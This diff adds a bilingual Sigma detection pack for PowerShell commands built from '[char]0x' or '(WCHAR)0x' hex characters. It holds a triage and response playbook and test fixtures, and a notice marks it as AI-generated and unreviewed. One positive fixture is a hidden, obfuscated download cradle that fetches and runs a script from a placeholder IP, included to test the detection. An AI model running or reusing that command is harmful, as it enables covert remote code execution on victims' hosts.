@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "e312efd0-35a1-407f-8439-b8d434b438a6",
+    "title": "Potential PowerShell Obfuscation Via WCHAR/CHAR",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_obfuscation_via_utf8.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_obfuscation_via_utf8.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso se inició con una línea de comandos que contiene la sintaxis de caracteres codificados '[char]0x' o '(WCHAR)0x', una técnica habitual para ocultar comandos de PowerShell. Asuma que puede haber ejecución maliciosa ofuscada hasta que se demuestre lo contrario.",
+      "what_it_detects": "Eventos de creación de procesos en Windows cuyo CommandLine contiene '[char]0x' o '(WCHAR)0x' (sin distinguir mayúsculas). Así se arman cadenas a partir de valores hexadecimales, por ejemplo [char]0x49+[char]0x45+[char]0x58 para formar 'IEX'.",
+      "why_it_matters": "Los atacantes codifican palabras clave como IEX, Invoke-Expression o URLs carácter por carácter para evadir firmas y revisiones manuales (T1027, archivos o información ofuscados) mientras ejecutan código con PowerShell (T1059.001). Suele ser parte de download cradles o de cargas de segunda etapa.",
+      "triage_steps": [
+        "Copie el CommandLine completo y decodifique cada valor hexadecimal a ASCII fuera de línea, sin ejecutarlo, para reconstruir el comando real.",
+        "Identifique Image y ParentImage: un padre de Office, navegador, wscript, mshta o un servicio es mucho más sospechoso que una consola interactiva.",
+        "Revise el usuario y el host: ¿es una cuenta privilegiada o de servicio? ¿Es un servidor o una estación de trabajo?",
+        "Busque en el registro de PowerShell Script Block Logging (evento 4104) del mismo host el script desofuscado y las etapas posteriores.",
+        "Revise los procesos hijo y las conexiones de red del proceso en +/- 15 minutos; anote las URLs, IPs y archivos que se descarguen o escriban.",
+        "Busque el mismo patrón de CommandLine o hash en otros endpoints y alertas previas del mismo usuario o host."
+      ],
+      "false_positives": [
+        "Las causas legítimas son poco comunes; la regla declara falsos positivos desconocidos.",
+        "Scripts de administración o de instaladores que usan [char]0x para insertar caracteres especiales o Unicode, como separadores o caracteres de control.",
+        "Ejercicios de red team, pruebas de detección o laboratorios de capacitación autorizados."
+      ],
+      "response_steps": [
+        "Confirme con el decodificado y el contexto si la actividad es maliciosa; valide con el dueño del sistema si parece un script administrativo.",
+        "Si es malicioso, aísle el endpoint con EDR y detenga el proceso y sus hijos.",
+        "Bloquee las URLs, IPs y hashes identificados y busque esos indicadores en todo el entorno.",
+        "Elimine la persistencia encontrada (tareas programadas, claves Run, servicios, WMI) y los archivos descargados, previa preservación de evidencia.",
+        "Restablezca las credenciales del usuario afectado y restaure el host desde una imagen confiable si hubo compromiso."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque la construcción de comandos con caracteres hexadecimales rara vez es legítima y se asocia directamente con evasión y ejecución de código."
+    },
+    "en": {
+      "summary": "A process started with a command line containing the encoded character syntax '[char]0x' or '(WCHAR)0x', a common way to hide PowerShell commands. Treat it as possible obfuscated malicious execution until proven otherwise.",
+      "what_it_detects": "Windows process creation events whose CommandLine contains '[char]0x' or '(WCHAR)0x' (case-insensitive). This builds strings from hex values, for example [char]0x49+[char]0x45+[char]0x58 to form 'IEX'.",
+      "why_it_matters": "Attackers encode keywords like IEX, Invoke-Expression or URLs character by character to evade signatures and manual review (T1027, obfuscated files or information) while running code through PowerShell (T1059.001). It often appears in download cradles and second-stage loaders.",
+      "triage_steps": [
+        "Copy the full CommandLine and decode each hex value to ASCII offline, without executing it, to rebuild the real command.",
+        "Check Image and ParentImage: an Office app, browser, wscript, mshta or service parent is far more suspicious than an interactive console.",
+        "Review the user and host: privileged or service account? Server or workstation?",
+        "Search PowerShell Script Block Logging (event 4104) on the same host for the deobfuscated script and later stages.",
+        "Review child processes and network connections of the process within +/- 15 minutes; record downloaded or written URLs, IPs and files.",
+        "Hunt for the same CommandLine pattern or hash on other endpoints and in earlier alerts for the same user or host."
+      ],
+      "false_positives": [
+        "Legitimate causes are rare; the rule lists false positives as unknown.",
+        "Admin or installer scripts using [char]0x to insert special or Unicode characters such as separators or control characters.",
+        "Authorized red team exercises, detection tests or training labs."
+      ],
+      "response_steps": [
+        "Confirm maliciousness from the decoded command and context; check with the system owner if it looks like an admin script.",
+        "If malicious, isolate the endpoint via EDR and stop the process and its children.",
+        "Block identified URLs, IPs and hashes and sweep the environment for them.",
+        "Remove any persistence found (scheduled tasks, Run keys, services, WMI) and dropped files after preserving evidence.",
+        "Reset the affected user's credentials and reimage the host from a trusted baseline if compromise is confirmed."
+      ],
+      "severity_rationale": "High fits because building commands from hex character values is rarely legitimate and is directly tied to evasion and code execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell launched by Word that builds 'IEX' from [char]0x values to run a download cradle",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -NoP -W Hidden -c \"&([char]0x49+[char]0x45+[char]0x58) (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')\"",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "PowerShell with inline C# using an uppercase (WCHAR)0x cast",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-07.andes.example.com",
+          "User": "ANDES\\svc_batch",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -c \"Add-Type -TypeDefinition 'public class X{public static string s=((WCHAR)0x41).ToString();}'\"",
+          "IntegrityLevel": "High"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin script that uses a decimal [char] cast, not the hex [char]0x form",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0201.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -File C:\\Scripts\\report.ps1 -Separator ([char]59)",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Fully qualified [System.Char]0x cast, which does not contain the literal '[char]0x' substring",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0201.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -c \"Write-Output ([System.Char]0x2014)\"",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
